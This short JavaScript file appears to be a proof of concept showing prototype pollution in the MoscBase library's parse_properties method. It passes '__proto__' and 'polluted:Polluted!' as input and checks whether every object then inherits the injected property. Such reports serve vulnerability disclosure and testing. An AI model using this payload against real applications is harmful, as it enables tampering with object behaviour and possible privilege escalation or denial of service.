const MoscBase = require('../src');
console.log({}.polluted)
var result = new MoscBase({}).parse_properties("__proto__", "polluted:Polluted!", {}, "");
console.log({}.polluted)